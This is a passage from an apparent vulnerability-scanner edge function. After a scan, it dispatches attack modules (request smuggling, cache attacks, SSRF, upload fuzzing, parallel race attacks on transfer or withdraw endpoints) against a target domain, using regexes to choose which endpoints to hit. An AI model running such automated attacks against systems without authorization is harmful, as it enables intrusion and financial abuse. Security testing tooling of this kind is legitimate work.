        headers: {
          Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ targetId }),
      }).catch((e) => console.error("zeroday-engine dispatch failed:", e));

      // ── Deep attack modules (safe-by-default, no user context required) ──
      const baseUrl = (target as any)?.domain ? `https://${(target as any).domain}` : null;
      if (baseUrl) {
        const auth = { Authorization: `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`, "Content-Type": "application/json" };
        const fnUrl = (n: string) => `${Deno.env.get("SUPABASE_URL")}/functions/v1/${n}`;
        const dispatch = (name: string, body: any) =>
          fetch(fnUrl(name), { method: "POST", headers: auth, body: JSON.stringify(body) })
            .catch(e => console.error(`${name} dispatch failed:`, e));

        // 1. URL-only deep modules (always safe)
        for (const [name, body] of [
          ["recon-deep",     { targetId, baseUrl }],
          ["bac-tester",     { targetId, baseUrl }],
          ["smuggler",       { targetId, baseUrl }],
          ["cache-attack",   { targetId, baseUrl }],
          ["graphql-attack", { targetId, endpoint: `${baseUrl}/graphql` }],
          ["live-cve-runner",{ targetId, baseUrl }],
        ] as const) {
          dispatch(name, body);
        }

        // 2. SSRF-deep — fan out per endpoint+param that smells like a URL/path/redirect
        try {
          const { data: eps } = await db.from("discovered_endpoints")
            .select("url, parameters").eq("target_id", targetId).limit(40);
          const ssrfParamRx = /^(url|uri|redirect|redirect_uri|next|return|return_to|callback|dest|destination|target|continue|image|img|src|file|path|fetch|domain|host|proxy|out|to|u|link)$/i;
          let ssrfQueued = 0;
          for (const ep of (eps || [])) {
            const params = (ep.parameters as Record<string, string>) || {};
            for (const pk of Object.keys(params)) {
              if (!ssrfParamRx.test(pk)) continue;
              dispatch("ssrf-deep", { targetId, endpointUrl: ep.url, paramName: pk });
              if (++ssrfQueued >= 12) break;
            }
            if (ssrfQueued >= 12) break;
          }

          // 3. Upload-fuzzer — endpoints whose path screams upload
          const uploadRx = /(upload|files?|attachment|avatar|image|media|import)\b/i;
          let upQueued = 0;
          for (const ep of (eps || [])) {
            try {
              const u = new URL(ep.url);
              if (!uploadRx.test(u.pathname)) continue;
              dispatch("upload-fuzzer", { targetId, uploadUrl: ep.url, fileField: "file" });
              if (++upQueued >= 4) break;
            } catch {}
          }

          // 4. Race-runner — endpoints with POST/PUT for race-prone actions
          const raceRx = /(coupon|redeem|withdraw|transfer|purchase|order|vote|like|follow|claim)\b/i;
          let raceQueued = 0;
          for (const ep of (eps || [])) {
            try {
              const u = new URL(ep.url);
              if (!raceRx.test(u.pathname)) continue;
              dispatch("race-runner", { targetId, url: ep.url, method: "POST", parallel: 20 });
              if (++raceQueued >= 3) break;
            } catch {}
          }
        } catch (e) {
          console.error("deep-module fanout failed:", e);
        }
      }
    } catch (e) {
      console.error("post-scan auto-trigger failed:", e);
    }

    return new Response(
      JSON.stringify({
        success: true,
        parametersClassified: vulnChecks.length,
        differentialTests: diffResults.length,
        vulnsFound: vulnFindings.length,
        passiveIssues: passiveResults.length,
        cvesMatched: cveResults.length,
        aiAssessments: aiAssessments.assessments.length,
        aiVerified: verifiedCount,
        falsePositivesFlagged: falsePositiveCount,
        approvalsQueued: approvalCount,
        autoAccepted: autoAcceptedCount,
        owaspCoverage,
        experiencesRecorded: experienceRecords.length,
        strategyClassesDisabled: disabledClasses.size,
        methodDiscoveries: methodDiscoveryCount,
        evolutionaryMutations: experienceRecords.filter(e => (e.metadata as any)?.mutation).length,
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (e) {
    console.error("Vuln scanner error:", e);
    return new Response(
      JSON.stringify({ error: e instanceof Error ? e.message : "Unknown error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
